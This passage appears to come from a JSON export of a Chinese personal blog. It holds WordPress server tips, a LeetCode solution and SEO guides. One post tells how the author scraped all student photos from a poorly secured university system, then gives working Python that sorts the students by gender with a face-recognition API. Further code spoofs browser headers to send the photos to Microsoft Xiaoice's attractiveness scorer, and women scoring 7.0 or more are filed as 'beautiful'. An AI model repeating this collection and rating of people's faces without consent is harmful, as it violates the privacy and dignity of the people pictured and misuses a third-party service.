image&#x2F;bmp mod_gzip 需要自己开启mod_gzip模块，然后把下面的内容写在 .htaccess中即可 12345678910&lt;ifModule mod_gzip.c&gt;mod_gzip_on Yesmod_gzip_dechunk Yesmod_gzip_item_include file .(html?txtcssjsphppl)$mod_gzip_item_include handler ^cgi-script$mod_gzip_item_include mime ^text&#x2F;.*mod_gzip_item_include mime ^application&#x2F;x-javascript.*mod_gzip_item_exclude mime ^image&#x2F;.*mod_gzip_item_exclude rspheader ^Content-Encoding:.*gzip.*&lt;&#x2F;ifModule&gt; GZIP测试工具 https://varvy.com/tools/gzip/ 输入你的站点，然后看看是不是压缩了呢？ 上传图片失败解决办法 不要相信网上一堆chmod 777的方法，虽然是可行的，但是不安全 正确的方法应该是修改文件所有者： chown -R apache /var/www/html/wp-content/uploads 当然你也可以把整个改成apache，这样你升级插件什么的也不会有问题 chown -R apache /var/www/html/ 如果提示的内容是missing a temporary folder 修改/etc/php.ini ，指定个临时目录 upload_tmp_dir = /tmp/ 重启服务器即可 service httpd restart YOAST SEO sitemap 404 解决办法 博主发现YOAST SEO 创建的sitemap访问直接 404。 修改 .htaccess file，把下面内容加在wordpress rewrite规则前面就可以啦 Yoast SEO - XML Sitemap Rewrite Fix RewriteEngine On RewriteBase / RewriteRule ^sitemap_index.xml$ /index.php?sitemap=1 [L] RewriteRule ^locations.kml$ /index.php?sitemap=wpseo_local_kml [L] RewriteRule ^geo_sitemap.xml$ /index.php?sitemap=geo [L] RewriteRule ^([^/]+?)-sitemap([0-9]+)?.xml$ /index.php?sitemap=$1&amp;sitemap_n=\\(2 [L] RewriteRule ^([a-z]+)?-?sitemap.xsl\\) /index.php?xsl=$1 [L] # END Yoast SEO - XML Sitemap Rewrite Fix 参考 http://kb.yoast.com/article/77-my-sitemap-index-is-giving-a-404-error-what-should-i-do 参考资料 How To Install Wordpress on Centos 6 https://www.digitalocean.com/community/tutorials/how-to-install-wordpress-on-centos-6--2 Installing WordPress on CentOS 5/6 http://www.rackspace.com/knowledge_center/article/installing-wordpress-on-centos-56","categories":[{"name":"others","slug":"others","permalink":"https://www.hrwhisper.me/categories/others/"},{"name":"建站经验","slug":"others/建站经验","permalink":"https://www.hrwhisper.me/categories/others/%E5%BB%BA%E7%AB%99%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"wordpress","slug":"wordpress","permalink":"https://www.hrwhisper.me/tags/wordpress/"},{"name":"Centos","slug":"Centos","permalink":"https://www.hrwhisper.me/tags/Centos/"},{"name":"Linux","slug":"Linux","permalink":"https://www.hrwhisper.me/tags/Linux/"}]},{"title":"leetcode Bulb Switcher","slug":"leetcode-bulb-switcher","date":"2015-12-19T10:08:11.000Z","updated":"2021-01-08T13:32:16.843Z","comments":true,"path":"leetcode-bulb-switcher/","link":"","permalink":"https://www.hrwhisper.me/leetcode-bulb-switcher/","excerpt":"leetcode Bulb Switcher There are n bulbs that are initially off. You first turn on all the bulbs. Then, you turn off every second bulb. On the third round, you toggle every third bulb (turning on if it's off or turning off if it's on). For the _n_th round, you only toggle the last bulb. Find how many bulbs are on after n rounds. Example: Given n = 3. At first, the three bulbs are [off, off, off]. After first round, the three bulbs are [on, on, on]. After second round, the three bulbs are [on, off, on]. After third round, the three bulbs are [on, off, off]. So you should return 1, because there is only one bulb is on.","text":"leetcode Bulb Switcher There are n bulbs that are initially off. You first turn on all the bulbs. Then, you turn off every second bulb. On the third round, you toggle every third bulb (turning on if it's off or turning off if it's on). For the _n_th round, you only toggle the last bulb. Find how many bulbs are on after n rounds. Example: Given n = 3. At first, the three bulbs are [off, off, off]. After first round, the three bulbs are [on, on, on]. After second round, the three bulbs are [on, off, on]. After third round, the three bulbs are [on, off, off]. So you should return 1, because there is only one bulb is on. 题目地址：leetcode Bulb Switcher 题意： 给定n，初始的时候灯都是灭的，让你进行进行开关灯。第一轮的时候把1的倍数反转（原来关就开，原来开就关），第二轮把2的倍数翻转，以此类推到第n轮。 求最后灯打开的个数 思路： 我们来分析下：对于素数，那么它仅有1和它本身，最后一定是关掉的。 对一普通的，一定是关掉的，因子成对出现 对于完全平方数，因为有一个倍数不成对出现，所以一定是打开的。比如4 =&gt; 1,4 2 所以本题就是求1~n有几个完全平方数。 那么，怎么求呢?从1开始到n，每个数测试一下？时间复杂度O(n)，太慢 正确的是直接sqrt(n)，就可以算出来啦~ C++ 123456class Solution &#123;public: int bulbSwitch(int n) &#123; return sqrt(n); &#125;&#125;; Python 1234567class Solution(object): def bulbSwitch(self, n): &quot;&quot;&quot; :type n: int :rtype: int &quot;&quot;&quot; return int(math.sqrt(n)) Java 12345public class Solution &#123; public int bulbSwitch(int n) &#123; return (int)Math.sqrt(n); &#125;&#125;","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"},{"name":"Java","slug":"Java","permalink":"https://www.hrwhisper.me/tags/Java/"}]},{"title":"在我爬了全校的照片之后........","slug":"after-i-get-all-photos-from-university","date":"2015-12-17T16:00:37.000Z","updated":"2021-01-08T13:42:14.024Z","comments":true,"path":"after-i-get-all-photos-from-university/","link":"","permalink":"https://www.hrwhisper.me/after-i-get-all-photos-from-university/","excerpt":"博主上次看到暮光博客上 把他们学校的照片都download下来了。 于是，博主觉得.....爬下来看看漂亮妹纸的照片好像是个不错的主意啊....... 原始人类的本能(/▽＼=)","text":"博主上次看到暮光博客上 把他们学校的照片都download下来了。 于是，博主觉得.....爬下来看看漂亮妹纸的照片好像是个不错的主意啊....... 原始人类的本能(/▽＼=) 爬取照片 这个......我们学校的做太烂了。。。连外网都可以直接爬。。。 怕被请去喝茶，特地SS全局下抓，然而速度慢，后面直接校内网上了=v= 轻轻松松的爬了下来，要注意的就是不知道一个班级人数和一个年级的班级，还有一个院的专业人数。 所以要进行试探。 不放代码，以防不良影响。 性别判断 对于男女比例7：3的学校来说。。。。。你让我一个个看。。。看到的都是汉纸，这不是坑爹么！！（╯－＿－）╯╧╧ 哥哥懒得看。 于是....男同胞们。。。你们要被发配到另一个文件夹。。。。。 性别判断用啥好呢~~~自己实现一个天都黑了，估计达到一定的精度还得一段时间。 FACE ++ 有API 注册一个就可以用了~ 当然还有一些刷脸失败的 →_→ 移动到error里面吧。 ps: 存在一些误判，比如把一些妹纸当作汉纸对待了，还有一些刷脸失败的，这里存在以下假设 好看的妹纸应该是女性特征分明的 ，所以误判的妹纸...... 好看的妹纸刷脸必须成功 123456789101112131415161718192021222324252627from facepp import API, Fileimport shutilimport osif __name__ == &#x27;__main__&#x27;: API_KEY = &#x27;&#x27; API_SECRET = &#x27;&#x27; api = API(API_KEY, API_SECRET) photo_path = r&#x27;G:/photos/&#x27; for path, subdirs, files in os.walk(photo_path): print path, subdirs, files if path.find(&#x27;man&#x27;) != -1 or path.find(&#x27;error&#x27;) != -1: continue for img in files: print path + &#x27;/&#x27; + img try: result = api.detection.detect(img=File(path + &#x27;/&#x27; + img), mode=&#x27;oneface&#x27;) if result[&#x27;face&#x27;][0][&#x27;attribute&#x27;][&#x27;gender&#x27;][&#x27;value&#x27;] == &#x27;Male&#x27;: man_path = path + &#x27;/man&#x27; if not os.path.exists(man_path): os.mkdir(man_path) shutil.move(path + &#x27;/&#x27; + img, man_path + &#x27;/&#x27; + img) except Exception, e: error_path = path + &#x27;/error&#x27; if not os.path.exists(error_path): os.mkdir(error_path) shutil.move(path + &#x27;/&#x27; + img, error_path + &#x27;/&#x27; + img) 颜值打分 剩下还有一堆妹纸！！！ 博主看得眼镜都花了。 决定应该提高门槛，让机器筛选，只看达到一定的颜值的妹纸 So如下计划：先给一些照片打好分数作为训练样本...抽出关键点作为特征....训练之........打分.......... 等做好了哥哥都 看完了。。。= = 那怎么办呢。 听说最近 Microsoft 那只很 嚣张的小冰又升级了，上面有拼颜值功能 ： http://kan.msxiaobing.com/V3/Portal ms-xiaoice-yanzhi 虽然说是叫拼颜值，然而单人的情况会直接打分：如下 ms-xiaoice-yanzhi-guanyuan-meizhi 在抓包、分析JS后轻易的可以伪装正常用户进行功能请求： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667# -*- coding:utf-8 -*-# Created by hrwhisper on 2015/12/16.import jsonimport reimport requestsimport timeimport os, shutilif __name__ == &#x27;__main__&#x27;: myheader = &#123; &#x27;Host&#x27;: &#x27;kan.msxiaobing.com&#x27;, &#x27;Connection&#x27;: &#x27;keep-alive&#x27;, &#x27;Accept&#x27;: &#x27;*/*&#x27;, &#x27;Origin&#x27;: &#x27;http://kan.msxiaobing.com&#x27;, &#x27;X-Requested-With&#x27;: &#x27;XMLHttpRequest&#x27;, &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36&#x27;, &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded; charset=UTF-8&#x27;, &#x27;Referer&#x27;: &#x27;http://kan.msxiaobing.com/V3/Portal&#x27;, &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;, &#x27;Accept-Language&#x27;: &#x27;zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4&#x27;, &#125; url1 = &#x27;http://kan.msxiaobing.com/Api/Image/UploadBase64&#x27; url2 = &#x27;http://kan.msxiaobing.com/Api/ImageAnalyze/Process?service=yanzhi&amp;tid=52a90c91aaeb4af698bec8ae2106cb36&#x27; pattern = re.compile(r&#x27;\\d+\\.\\d+&#x27;) s = requests.Session() photo_path = &#x27;G:/photos&#x27; for path, subdirs, files in os.walk(photo_path): print path, subdirs, files if path.find(&#x27;man&#x27;) != -1 or path.find(&#x27;error&#x27;) != -1 or path.find(&#x27;beautiful&#x27;) != -1: continue for img in files: with open(path + &#x27;/&#x27; + img, &#x27;rb&#x27;) as f: image_data = f.read() image_data = image_data.encode(&quot;base64&quot;) try: r = s.post(url1, data=image_data, headers=myheader) res = json.loads(r.text) data = &#123; &#x27;msgId&#x27;: int(round(time.time() * 1000)), &#x27;timestamp&#x27;: int(time.time()), &#x27;senderId&#x27;: &#x27;mtuId&#x27; + str(int(round(time.time() * 1000))), # ot = &quot;mtuId&quot; + Date.now(); &#x27;content[imageUrl]&#x27;: res[&#x27;Host&#x27;] + res[&#x27;Url&#x27;] # 上传文件放回来的 &#125; r = s.post(url2, data=data, headers=myheader) res = json.loads(r.text) match = pattern.search(res[&#x27;content&#x27;][&#x27;text&#x27;]) score = float(match.group()) print path + &#x27;/&#x27; + img, score if score &gt;= 7.0: beautiful_path = path + &#x27;/beautiful&#x27; if not os.path.exists(beautiful_path): os.mkdir(beautiful_path) shutil.move(path + &#x27;/&#x27; + img, beautiful_path + &#x27;/&#x27; + img) except Exception, e: error_path = path + &#x27;/ice_error&#x27; if not os.path.exists(error_path): os.mkdir(error_path) shutil.move(path + &#x27;/&#x27; + img, error_path + &#x27;/&#x27; + img) 写在最后 =v= 博主都大四旺了，也就看看妹纸就好。。。。。 不要问我图在哪，上面那两图就是其中的。 (/▽＼=) 逃 = =禽兽舍友前来围观，博主发现这么晚了衣服都还没洗。。。 楼上的妹纸们中午动静好大，这是穿着高跟鞋在宿舍里乱跑么。。。 expression-louxia_shuai 吵了我们一中午。。。。→_→ 我觉得再吵应该派舍友去和她们谈谈人生理想 : ) 嗯，睡觉。","categories":[{"name":"技术改变生活","slug":"技术改变生活","permalink":"https://www.hrwhisper.me/categories/%E6%8A%80%E6%9C%AF%E6%94%B9%E5%8F%98%E7%94%9F%E6%B4%BB/"}],"tags":[{"name":"生活","slug":"生活","permalink":"https://www.hrwhisper.me/tags/%E7%94%9F%E6%B4%BB/"},{"name":"Cool","slug":"Cool","permalink":"https://www.hrwhisper.me/tags/Cool/"},{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"爬虫","slug":"爬虫","permalink":"https://www.hrwhisper.me/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"本博客 SEO实战记录","slug":"seo-in-action","date":"2015-12-17T15:05:28.000Z","updated":"2021-01-08T13:42:14.032Z","comments":true,"path":"seo-in-action/","link":"","permalink":"https://www.hrwhisper.me/seo-in-action/","excerpt":"本文记录本博客SEO的一些优化方法。不定期更新。","text":"本文记录本博客SEO的一些优化方法。不定期更新。 YOAST SEO插件 wordpress 下 强烈建议安装。 可以帮你修改每页的标题、写博客的时候计算关键词、生成Sitemap等等。 重定向wordpress 固定链接 之前的网址格式是www.hrwhisper.me/archives/id 之后改为了www.hrwhisper.me/title 那么，原来的就一片404了。 如下：（google search console） 怎么办呢?答案是用.htaccess进行重定向： http://hrwhisper.me/archives/1484 RedirectMatch 301 ^/archives/([0-9]*)$ https://www.hrwhisper.me/?p=$1 http://hrwhisper.me/archives/date/2​015/05/02 RedirectMatch 301 ^/archives/date/([0-9]*)/([0-9]*)/([0-9]*)$ https://www.hrwhisper.me/$1/$2/$3/ http://hrwhisper.me/archives/tag/bi​t-manipulation RedirectMatch 301 ^/archives/tag/(.*)$ https://www.hrwhisper.me/tag/$1/ 还有https://www.hrwhisper.me/archives/category/code/的，可以和上面的合并 RedirectMatch 301 ^/archives/(.*)$ https://www.hrwhisper.me/$1/ 注意：中文的URL会被自动decode，也就是说你在.htaccess中只要写中文即可。 RedirectMatch 301 ^/关于我$ https://www.hrwhisper.me/about-me/ 最后，我的部分.htaccess: 12345678910111213141516RedirectMatch 301 ^&#x2F;archives&#x2F;([0-9]+)$ https:&#x2F;&#x2F;www.hrwhisper.me&#x2F;?p&#x3D;$1RedirectMatch 301 ^&#x2F;archives&#x2F;date&#x2F;([0-9]+)&#x2F;([0-9]+)$ https:&#x2F;&#x2F;www.hrwhisper.me&#x2F;$1&#x2F;$2&#x2F;RedirectMatch 301 ^&#x2F;archives&#x2F;date&#x2F;([0-9]+)&#x2F;([0-9]+)&#x2F;page&#x2F;(.*)$ https:&#x2F;&#x2F;www.hrwhisper.me&#x2F;$1&#x2F;$2&#x2F;page&#x2F;$3&#x2F;RedirectMatch 301 ^&#x2F;archives&#x2F;date&#x2F;([0-9]+)&#x2F;([0-9]+)&#x2F;([0-9]+)$ https:&#x2F;&#x2F;www.hrwhisper.me&#x2F;$1&#x2F;$2&#x2F;$3&#x2F;RedirectMatch 301 ^&#x2F;archives&#x2F;date&#x2F;([0-9]+)&#x2F;([0-9]+)&#x2F;([0-9]+)&#x2F;page&#x2F;(.*)$ https:&#x2F;&#x2F;www.hrwhisper.me&#x2F;$1&#x2F;$2&#x2F;$3&#x2F;page&#x2F;$4&#x2F;RedirectMatch 301 ^&#x2F;archives&#x2F;(.*)$ https:&#x2F;&#x2F;www.hrwhisper.me&#x2F;$1&#x2F;RedirectMatch 301 ^&#x2F;tag&#x2F;图像处理&#x2F;$ https:&#x2F;&#x2F;www.hrwhisper.me&#x2F;tag&#x2F;image-processing&#x2F;RedirectMatch 301 ^&#x2F;tag&#x2F;爬虫&#x2F;$ https:&#x2F;&#x2F;www.hrwhisper.me&#x2F;tag&#x2F;crawler&#x2F;RedirectMatch 301 ^&#x2F;tag&#x2F;python库&#x2F;$ https:&#x2F;&#x2F;www.hrwhisper.me&#x2F;tag&#x2F;python-package&#x2F;RedirectMatch 301 ^&#x2F;tag&#x2F;心情&#x2F;$ https:&#x2F;&#x2F;www.hrwhisper.me&#x2F;tag&#x2F;moods&#x2F;RedirectMatch 301 ^&#x2F;mymood&#x2F;$ https:&#x2F;&#x2F;www.hrwhisper.me&#x2F;tag&#x2F;moods&#x2F;RedirectMatch 301 ^&#x2F;tag&#x2F;环境配置&#x2F;$ https:&#x2F;&#x2F;www.hrwhisper.me&#x2F;tag&#x2F;running-environment&#x2F;RedirectMatch 301 ^&#x2F;关于&#x2F;$ https:&#x2F;&#x2F;www.hrwhisper.me&#x2F;about-me&#x2F;RedirectMatch 301 ^&#x2F;关于我$ https:&#x2F;&#x2F;www.hrwhisper.me&#x2F;about-me&#x2F; 参考： https://perishablepress.com/redirect-wordpress-date-archives-htaccess/ Sitemap提交 google bing baidu ：虽然提交了并没什么卵用。。。感觉还是每天抓取频率太低。可能和百度看不上本站有关，观察中。 360 sougou ：搜狗绝对是看不上本站。。 除此之外robots.txt 声明sitemap位置 123456Sitemap: https:&#x2F;&#x2F;www.hrwhisper.me&#x2F;post-sitemap.xmlSitemap: https:&#x2F;&#x2F;www.hrwhisper.me&#x2F;post_tag-sitemap.xmlSitemap: https:&#x2F;&#x2F;www.hrwhisper.me&#x2F;category-sitemap.xmlSitemap: https:&#x2F;&#x2F;www.hrwhisper.me&#x2F;page-sitemap.xmlUser-agent: *Disallow: &#x2F;wp-admin&#x2F; 参考 http://www.sitemaps.org/protocol.html#submit_robots 原创保护 每篇文章后加入如下： 1234echo &#39;本博客若无特殊说明则由 &lt;a href&#x3D;&quot;&#39;.get_site_url().&#39;&quot; title&#x3D;&quot;&#39;. get_the_author().&#39;&quot;&gt;&#39;. get_the_author() .&#39;&lt;&#x2F;a&gt; 原创发布&lt;br&#x2F;&gt;&#39;;echo &#39;转载请点名出处：&lt;a href&#x3D;&quot;&#39;.get_site_url().&#39;&quot; title&#x3D;&quot;&#39;.get_bloginfo().&#39;&quot;&gt;&#39; .get_bloginfo().&#39;&lt;&#x2F;a&gt; &gt; &#39;;echo &#39;&lt;a href&#x3D;&quot;&#39;.get_permalink().&#39;&quot; title&#x3D;&quot;&#39;.get_the_title().&#39;&quot;&gt;&#39; .get_the_title().&#39;&lt;&#x2F;a&gt;&lt;br&#x2F;&gt;&#39;;echo &#39;本文地址：&lt;a href&#x3D;&quot;&#39;.get_permalink().&#39;&quot; title&#x3D;&quot;&#39;.get_the_title().&#39;&quot;&gt;&#39; .get_permalink().&#39;&lt;&#x2F;a&gt;&#39;; nofollow使用 底部sns nofollow了，这个只是提供联系方式，和网站内容无关。 每篇文章 continue reading 也是，这个锚文本没意义。 W3C认证 W3C验证地址传送门 以修改多说为例： Error: Attribute pubdate not allowed on element time at this point. From line 178, column 120; to line 178, column 170 ment-106\"&gt;2015年7 Attributes for element time: 在duoshuo/comments-seo.php 12&lt;time pubdate datetime=”%2$s”&gt;%3$s&lt;/time&gt;&lt;/a&gt;’,改为&lt;time datetime=”%2$s”&gt;%3$s&lt;/time&gt;&lt;/a&gt;’, Warning: The name attribute is obsolete. Consider putting an id attribute on the nearest container instead. From line 342, column 10; to line 342, column 28 _ _ 123&lt;/script&gt;&lt;a name=”comments”&gt;&lt;/a&gt;duoshuo/comments.php删掉&lt;a name=”comments”&gt;&lt;/a&gt; Warning: Article lacks heading. Consider using h2-h6 elements to add identifying headings to all articles. From line 376, column 4; to line 376, column 45 _-187\"&gt; _ 123duoshuo/comments-seo.php&lt;article id=”comment-&lt;?php comment_ID(); ?&gt;” class=”comment”&gt;改为 &lt;div id=”comment-&lt;?php comment_ID(); ?&gt;” class=”comment”&gt; ps:博主blog除了个别多说评论页面有表情的提示无alt属性没通过验证外，其他的均通过W3C验证。 移动自适应 原来用 wptouch pro 现在已经响应式主题。 根据百度建议加上如下标志，帮助百度理解页面适用于PC和手机 1&lt;meta name=&quot;applicable-device&quot;content=&quot;pc,mobile&quot;&gt; 可以在google search console上查看移动设备的适应性 Https 开启了全站https，搜索引擎把HTTPS作为一个排名的因素 效果 alexa排名，从优化11月1700W开始到现在76W seo-alexa-16-02-20 google bot也反应了一定的效果。。 seo-googlebot-2015-12-17 接下来 主要是丰富网站内容吧~ 还有好多可以分享的东西~不仅仅是leetcode ps:可以看该下网址增加SEO知识： SEO 基础","categories":[{"name":"others","slug":"others","permalink":"https://www.hrwhisper.me/categories/others/"},{"name":"建站经验","slug":"others/建站经验","permalink":"https://www.hrwhisper.me/categories/others/%E5%BB%BA%E7%AB%99%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"wordpress","slug":"wordpress","permalink":"https://www.hrwhisper.me/tags/wordpress/"},{"name":"SEO","slug":"SEO","permalink":"https://www.hrwhisper.me/tags/SEO/"}]},{"title":"SEO 基础","slug":"seo-theory","date":"2015-12-17T15:00:19.000Z","updated":"2021-01-08T13:42:14.033Z","comments":true,"path":"seo-theory/","link":"","permalink":"https://www.hrwhisper.me/seo-theory/","excerpt":"写在前面 为什么要学SEO？ 又不进行商业用途 WEB开发的时候，你会更加的规范 知识上的扩充 让过多人看到你的博客站点","text":"写在前面 为什么要学SEO？ 又不进行商业用途 WEB开发的时候，你会更加的规范 知识上的扩充 让过多人看到你的博客站点 一些说明 搜索引擎不喜欢flash和js生成的内容 跳转用301跳转，其他跳转如JS跳转，302跳转不建议使用 建议采用静态URL 搜索引擎一般把二级域名当作独立站点看 meta keywords tag 和 description tag 对排名一般没什么用 SEO需要付出时间 SEO最根本的方法还是要提高网站内容质量 不要在标题中加入搜索次数高，但与本页面无关的关键词 pagerank工具条已经不再更新，所以新站的PR值永远是0了 域名的年龄也是一个影响排名的因素 网站目标 需要了解网站的目标，如信息类网站靠显示广告赢利，网站目标是尽量增加页面访问数(PV)，电子商务网站，以在线销售为目标，电子商务网站希望的是能转化的高质量目标流量，关键词研究的重点在于挑选和优化最相关的、交易类的关键词。 博主博客则主要只是想提高自己的排名，让更多人看到这个站点，交到更多的朋友~ 爬取和收录 Robots文件 百度搜索淘宝网，会发现如下: seo-robots-taobao robots.txt是何方神圣？ 搜索引擎访问任何一个网站到时候，都会先访问根目录下robots.txt文件。 robot.txt如果禁止搜索引擎抓取某些文件或目录，爬虫将遵守协议，不抓取被禁止的网址。 如下面的代码将禁止除google外所有搜索抓取任何内容 1234User-agent: GooglebotDisallow:User-agent: *Disallow: &#x2F; 使用noindex meata robots标签 如果你想禁止某些页面被收录，你可以： 1&lt;meta name=&quot;robots&quot; content=&quot;noindex&quot;&gt; noindex 和 robots.txt区别：前者是禁止收录，后者是禁止抓取 nofollow 1&lt;a href=&quot;URL&quot; rel=&quot;nofollow&quot;&gt; 比如github上个人主页： seo-github-nofollow nofollow标签用于告诉搜索引擎不要跟踪这个标签。 通常用于博客评论、论坛回帖上。 因为如果你的站点指向了垃圾站点，那么会影响你的网站的排名。而博客、论坛回帖可能有垃圾留言。用了nofollow能阻止搜索引擎的爬行和传递权重。 Nofollow 的另一个用途就是，在写文章并引用某个网站，但是并不想把您的权重传递给它。如揭发垃圾站点的时候。 PS：交换友情链接使用nofollow是无耻的行为。 速度影响抓取 网站来说，当下载页面所用的时间明显上升时，抓取的页面数量就极具下降。因为搜索引擎在一个特定的网站上爬行和抓取的总时间是有限的（除非网站规模小，用不完google给这个网站爬行的总时间） URL静态化 网页内容一般都是由程序实时生成，而不是在服务器上真的有相应的HTML文件存在。搜索引擎一般不喜欢动态的URL，因为它可能造成大量重复的内容。 比如下面的两个URL，这两个仅仅是参数的不同，却会被认为是两个页面 xxx.com/a.php?color=blue&amp;id=123 xxx.com/a.php?id=123&amp;color=blue 伪静态 一般静态化的方法是用服务器的URL重写模块（如果服务器是apache，那么就是mod_rewrite模块），这种方法叫做伪静态，因为它只是通过URL重写技术来让网址看起来像静态的。但对搜索引擎来说，真正的静态和伪静态没有区别。 wordpress在设置-固定链接可以设置伪静态的URL格式。 也可以通过修改 .htaccess 来自定义URL规则，包括301转向 URL设计 使用单词，最好包含关键词，或者描述性的词 越短越好，一个短的URL点击率比长的高2.5倍 百度尤其喜欢目录层次少的页面 不建议使用中文URL，否则会被base64编码，看起来就像乱码一样。 词和词之间用 - 隔开 301重定向 什么是301重定向 301重定向是服务器返回给用户/爬虫的HTTP响应报文的头部，说明本网址永久迁移到另一个地址。 其他常见状态码： 200 OK 202 请求被接受，但处理尚未完成 301 redirect 重定向 302 临时性转向 400 由于语法格式有误，服务器无法理解此请求。 不作修改，客户程序就无法重复此请求。 401 未授权 403 禁止访问 404 页面未找到 5XX 服务器出错 为什么用301重定向 除了301转向外，搜索引擎对其他的如JS转向，302转向很敏感，因为作弊者常用这些方法。 301重定向可以传递权重。B已经永久迁移到A站点，那么B的权重将累计到A 一些说明 百度对301转向反应很慢。 可以用.hataccess 进行301重定向 重复内容的危害 产生重复内容的原因 主要有: URL规范化没做好，如把404的重定向到首页（搜索引擎人为有大量和首页一样的页面） 被人转载和抄袭 镜像网站 如七牛CDN的话，强烈建议用robot.txt禁止抓取 危害 搜索引擎会从多个页面中尽量挑选出真正原创的版本，或者用户体验最好的版本，给予应有的排名，而其他复制的版本不再搜索结果中或者排在比较后面的位置。但搜索引擎来判断可能把本来是原创的页面判断成转载的内容，这使得原创内容排名不好，像被“惩罚”了一样。 消除复制内容 同站下的复制内容如果是URL问题找出解决即可。下面只说明防止被复制和转载。 有的转载会表明出处，但是有的就不会。 可以加入版权信息： 1234567echo ‘本博客若无特殊说明则由 &lt;a href=”‘.get_site_url().&#x27;” title=”‘. get_the_author().&#x27;”&gt;’. get_the_author() .&#x27;&lt;/a&gt; 原创发布&lt;br/&gt;’;echo ‘转载请点名出处：&lt;a href=”‘.get_site_url().&#x27;” title=”‘.get_bloginfo().&#x27;”&gt;’ .get_bloginfo().&#x27;&lt;/a&gt; &gt; ‘;echo ‘&lt;a href=”‘.get_permalink().&#x27;” title=”‘.get_the_title().&#x27;”&gt;’ .get_the_title().&#x27;&lt;/a&gt;&lt;br/&gt;’;echo ‘本文地址：&lt;a href=”‘.get_permalink().&#x27;” title=”‘.get_the_title().&#x27;”&gt;’ .get_permalink().&#x27;&lt;/a&gt;’; 这样对于直接复制的网址（一般也是用爬虫抓取）就直接把这些版权信息抓过去了。对于搜索引擎来说，指向原处的链接是判断原创的最重要的信号。 站点地图 sitemap和 Sitemap 前者是html版本的，后者是XML版本的，就差了首字母大写。站点地图有助于用户对网站结构的了解，搜索引擎可以更容易地去发现并抓取网站上的内容。 XML只是辅助的方法，它只是通知搜索引擎这些页面的存在，并不一定被收录，所以良好的网页结构是更重要滴。 wordpress可以用 Yoast SEO插件来生成XML站点地图。 robots.txt 中 sitemap 所有主流搜索引擎都支持robot.txt中指定网站站点地图的位置。 123456Sitemap: https:&#x2F;&#x2F;www.hrwhisper.me&#x2F;post-sitemap.xmlSitemap: https:&#x2F;&#x2F;www.hrwhisper.me&#x2F;post_tag-sitemap.xmlSitemap: https:&#x2F;&#x2F;www.hrwhisper.me&#x2F;category-sitemap.xmlSitemap: https:&#x2F;&#x2F;www.hrwhisper.me&#x2F;page-sitemap.xmlUser-agent: *Disallow: &#x2F;wp-admin&#x2F; 参考 (http://www.sitemaps.org/protocol.html#submit_robots)&gt; 在站长工具提交站点地图 先注册账号-验证网站所有权-上传Sitemaps（有的可能需要申请，如搜狗） google bing baidu 360 sougou 页面优化 建议title紧接在&lt;head&gt;后，这样搜索引擎就可以快速找到title标签 可以使用google 站长工具 搜索外观-HTML建议部分查看需要改进的地方 为每个网页创建独特的标题标签，如分页中可以在标题前加入第X页来区别，如第二页-标题 第三天页-标题 描述标签对关键词排名没有影响，但对点击率有一定的影响。（因为可能被拿来做搜索页的摘要） 关键词标签现在没卵用，不建议浪费时间写 正文优化 wordpress 插件YOAST SEO 在编辑文章的时候会给出优化建议 篇幅不大的页面出现两三次关键词即可，长的出现4~6次，不要堆积关键词。 正文前50~100个词中有较高的权重 要关注关键词的变化形式，如近义词 合理利用图片ALT文字 最好文件名和 alt 文本是简短而描述性很强 当图片作为链接使用时，一定要提供 alt 文本（切忌过长） 合理使用H标签使得文章层次分明 自然写作，其实优化就差不多了，只要有意识的想一下近义词即可。 W3C验证 一般同不通过对页面排名没有明显的影响。实际上绝大部分页面都无法百分百的通过W3C验证。搜索引擎也明白这一点。 所以，尽量更正验证报告中的错误，警告可以忽略。 W3C验证地址： https://validator.w3.org/ ps:博主blog除了个别多说评论页面有表情的提示无alt属性没通过验证外，其他的均通过W3C验证。 链接建设 锚文字 先介绍基本概念，锚文字。 1&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;www.hrwhisper.me&#x2F;&quot; &gt;细语呢喃&lt;&#x2F;a&gt; 这里的“细语呢喃”就是锚文字。 内部链接 选择描述性文字——您选择的用作链接的锚文本应该至少能够提供被链接页面 的基本信息。 避免如下情况： 使用与目标页面主题无关的锚文字，比如“页面”、“文章”或是“点击这里” 直接使用页面的 URL 作为锚文本（只有少数情况下，这样的方法是 合适的，比如推广或者是引用了某个网址） 用一个长句子或是一篇短文来实现的过长的锚文本 外部链接 外部链接使得被链接的页面及整个域名权重提高，外部链接越多，发出链接的网站本身权重越高，说明链接的页面受更多人信任，该域名就有更多的权重。 权重和信任度与特定关键词或主题没有直接关系。如果你的网站有来自央视、百度、清华大学、华尔街日报这种权重极高网站的链接，你的网站的权重会有质的提升，不管网站目标关键词是什么，排名都会有帮助。 外部链接也可以叫做反向链接 质量比数量更重要 总域名数比总链接数的作用更大 来自相关内容的链接网站对排名的帮助更大 反向链接增加的速度不宜过快 来自edu、gov域名的权重高 开放目录。将网站提交到高质量的目录上，能带来不错的外部链接 我觉得好的链接应该是对方站长编辑的行为，比如他认为你的博文有用，在他的文章正文中进行引用，这才是真正的投票。而友情链接带来的权重低很多。 吸引外部链接的几种途径 自己的网站 博客论坛留言 百科和问答类网站 网摘书签 如（delicious.com QQ书签 百度搜藏 Google书签） 现在大部分由nofollow 查看别人的外部链接 CMS主题模板 （如wordpress主题） 社会化媒体网站（如豆瓣、知乎、新浪微博 ，大部分由nofollow） SEO效果监测 主要监测下面三项，看看优化后是否有效果 收录数 外链数 关键词的排名 SEO作弊及惩罚 白帽、黑帽、灰帽 